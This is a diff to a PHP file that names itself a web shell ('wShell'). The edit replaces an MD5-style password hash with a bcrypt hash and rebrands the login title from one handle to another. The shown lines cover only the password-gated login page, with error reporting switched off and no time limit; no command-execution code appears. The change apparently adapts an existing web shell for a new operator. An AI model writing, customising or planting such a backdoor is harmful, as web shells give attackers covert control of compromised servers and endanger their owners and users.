@@ -2,12 +2,12 @@
 ob_start();
 set_time_limit(0);
 error_reporting(0);
-$hashed_password = '4f83f73236cdee92499a0ce098f36805'; //
+$hashed_password = '$2y$10$A5eEMmoEOmItvotPNy7K0OqjS5cw0zLyZoGpcEclYtPXGqdiEm0Vq'; //
 
 function admin_login() {
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script><title>Login</title></head><body class="bg-gradient-to-br from-blue-500 to-purple-600 min-h-screen flex items-center justify-center">';
     echo '<div class="bg-white rounded-lg shadow-2xl p-12 w-full max-w-md">';
-    echo '<h1 class="text-3xl font-bold text-center text-gray-800 mb-8">Pakketua69_x wShell</h1>';
+    echo '<h1 class="text-3xl font-bold text-center text-gray-800 mb-8">Dado x wShell</h1>';
     echo '<form method="post" class="space-y-4">';
     echo '<input type="password" name="password" placeholder="Enter password" class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 text-lg">';
     echo '<input type="submit" value="Login" class="w-full px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 cursor-pointer font-bold text-lg">';
